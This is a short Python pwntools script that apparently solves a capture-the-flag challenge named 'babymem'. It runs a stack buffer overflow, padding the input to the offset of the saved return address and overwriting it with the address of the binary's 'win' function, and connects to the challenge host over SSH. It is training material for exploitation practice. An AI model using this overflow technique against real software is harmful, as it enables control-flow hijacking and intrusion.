#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = 'babymem'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main''')

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    # entering in interactive before everything for give the chance of gdb catching up
    # the process before he dies or something.
    # get out of interactive sending ctrl+d to the process and resume the script.
    p.interactive()
    
    binary = ELF(chall_name)
    win_address = p64(binary.symbols['win'])

    payload_size = '300'
    #overflow = cyclic(299, n=8)
    overflow_until_ret = b'A' * cyclic_find('paaaaaaa', n=8)

    print(p.recv(timeout=2).decode())
    p.sendline(payload_size)
    print(p.recv(timeout=2).decode())

    #p.sendline(overflow)
    p.sendline(overflow_until_ret + win_address)

if get_flag:
    ssh_connection = ssh(host='ssh',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    
    run_exploit(p, False)
    ssh_connection.close()
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, True)
